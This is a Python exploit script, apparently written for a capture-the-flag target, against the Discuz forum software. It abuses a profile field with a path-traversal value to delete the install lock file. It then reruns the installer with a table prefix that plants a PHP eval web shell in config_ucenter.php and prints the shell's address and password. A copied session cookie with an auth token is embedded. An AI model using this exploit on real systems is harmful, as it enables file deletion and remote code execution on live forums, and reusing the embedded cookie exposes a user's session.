#!/usr/bin/env python3
import base64
import random
import re
import string

import requests

sess = requests.Session()
randstr = lambda len=5: ''.join(random.choice(string.ascii_lowercase) for _ in range(len))

##################################################
########## Customize these parameters ############
target = 'http://d4c49901ab9640f8a10f6e8e24bad177b0e755f426264c74.game.ichunqiu.com/'
# login target site first, and copy the cookie here
cookie = "UM_distinctid=15bcd2339e93d6-07b5ae8b41447e-8373f6a-13c680-15bcd2339ea636; CNZZDATA1261218610=1456502094-1493792949-%7C1494255360; csrftoken=NotKIwodOQHO0gdMyCAxpMuObjs5RGdeEVxRlaGoRdOEeMSVRL0sfeTBqnlMjtlZ; Zy4Q_2132_saltkey=I9b3k299; Zy4Q_2132_lastvisit=1506763258; Zy4Q_2132_ulastactivity=0adb6Y1baPukQGRVYtBOZB3wmx4nVBRonRprfYWTiUaEbYlKzFWL; Zy4Q_2132_nofavfid=1; Zy4Q_2132_sid=rsQrgQ; Zy4Q_2132_lastact=1506787935%09home.php%09misc; 7Csx_2132_saltkey=U8nrO8Xr; TMT0_2132_saltkey=E3q5BpyX; PXMk_2132_saltkey=rGBnNWu7; b4Gi_2132_saltkey=adC4r05k; b4Gi_2132_lastvisit=1506796139; b4Gi_2132_onlineusernum=2; b4Gi_2132_sendmail=1; b4Gi_2132_seccode=1.8dab0a0c4ebfda651b; b4Gi_2132_sid=BywqMy; b4Gi_2132_ulastactivity=51c0lBFHqkUpD3mClFKDxwP%2BI0JGaY88XWTT1qtFBD6jAJUMphOL; b4Gi_2132_auth=6ebc2wCixg7l%2F6No7r54FCvtNKfp1e5%2FAdz2SlLqJRBimNpgrbxhSEnsH5%2BgP2mAvwVxOdrrpVVX3W5PqDhf; b4Gi_2132_creditnotice=0D0D2D0D0D0D0D0D0D1; b4Gi_2132_creditbase=0D0D0D0D0D0D0D0D0; b4Gi_2132_creditrule=%E6%AF%8F%E5%A4%A9%E7%99%BB%E5%BD%95; b4Gi_2132_lastcheckfeed=1%7C1506800134; b4Gi_2132_checkfollow=1; b4Gi_2132_lastact=1506800134%09misc.php%09seccode"
shell_password = randstr()
db_host = ''
db_user = ''
db_pw = ''
db_name = ''
#################################################

path = '/home.php?mod=spacecp&ac=profile&op=base'
url = target + path

sess.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Referer': url})


# sess.proxies.update({'http': 'socks5://localhost:1080'})
# sess.proxies.update({'http': 'http://localhost:8080'})


def login(username=None, password=None):
    sess.headers.update({'Cookie': cookie})


def get_form_hash():
    r = sess.get(url)
    match = re.search(r'"member.php\?mod=logging&amp;action=logout&amp;formhash=(.*?)"', r.text, re.I)
    if match:
        return match.group(1)


def tamper(formhash, file_to_delete):
    data = {
        'formhash': (None, formhash),
        'profilesubmit': (None, 'true'),
        'birthprovince': (None, file_to_delete)
    }
    r = sess.post(url, files=data)
    if 'parent.show_success' in r.text:
        print('tamperred successfully')
        return True


def delete(formhash, file):
    if not tamper(formhash, file):
        return False

    image = b'iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAIAAAACUFjqAAAADUlEQVR4nGNgGAWkAwABNgABVtF/yAAAAABJRU5ErkJggg=='
    data = {
        'formhash': formhash,
        'profilesubmit': 'true'
    }
    files = {
        'birthprovince': ('image.png', base64.b64decode(image), 'image/png')
    }
    r = sess.post(url, data=data, files=files)
    if 'parent.show_success' in r.text:
        print('delete {} successfully'.format(file))
        return True


def getshell():
    install_url = target + '/install/index.php'
    r = sess.get(install_url)
    if '安装向导' not in r.text:
        print('install directory not exists')
        return False
   
    table_prefix = "x');@eval($_POST[{}]);('".format(shell_password)
    data = {
        'step': 3,
        'install_ucenter': 'yes',
        'dbinfo[dbhost]': db_host,
        'dbinfo[dbname]': db_name,
        'dbinfo[dbuser]': db_user,
        'dbinfo[dbpw]': db_pw,
        'dbinfo[tablepre]': table_prefix,
        'dbinfo[adminemail]': 'admin@admin.com',
        'admininfo[username]': 'admin',
        'admininfo[password]': 'admin',
        'admininfo[password2]': 'admin',
        'admininfo[email]': 'admin@admin.com',
    }
    r = sess.post(install_url, data=data)
    if '建立数据表 CREATE TABLE' not in r.text:
        print('write shell failed')
        return False
    print('shell: {}/config/config_ucenter.php'.format(target))
    print('password: {}'.format(shell_password))


if __name__ == '__main__':
    login()
    form_hash = get_form_hash()
    if form_hash:
        delete(form_hash, '../../../data/install.lock')
        getshell()
    else:
        print('failed')
